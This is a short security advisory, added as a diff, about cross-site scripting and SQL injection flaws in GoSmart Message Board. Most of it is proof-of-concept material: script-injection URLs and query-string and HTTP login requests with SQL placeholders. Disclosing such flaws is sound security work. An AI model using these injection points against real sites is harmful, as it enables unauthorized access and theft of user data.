@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/11361/info
+
+GoSmart Message Board is reported prone to multiple input validation vulnerabilities. These issues may allow a remote attacker to carry out cross-site scripting and SQL injection attacks. The cause of these issue is insufficient sanitization of user-supplied data.
+
+Cross-site scripting:
+/messageboard/Forum.asp?QuestionNumber=1&Find=1&Category=%22%3E%3Cscript
+%3Ealert%28%29%3C%2Fscript%3E%3C%22
+
+/messageboard/ReplyToQuestion.asp?MainMessageID=%22%3E%3Cscript%3Ealert%
+28%29%3C%2Fscript%3E%3C%22
+
+SQL injection:
+messageboard/Forum.asp?QuestionNumber=[SQL CODE HERE]&Find=1&Category=1
+
+messageboard/Forum.asp?Username=&Category=[SQL CODE HERE]
+
+messageboard/Forum.asp?QuestionNumber=[SQL CODE HERE]&Find=1
+
+messageboard/Forum.asp?Category=[SQL CODE HERE]
+
+POST /messageboard/Login_Exec.asp HTTP/1.1
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+Username=[SQL CODE HERE]&Password=1&Login=1
+
+
+POST /messageboard/Login_Exec.asp HTTP/1.1
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+Username=1&Password=[SQL CODE HERE]&Login=1
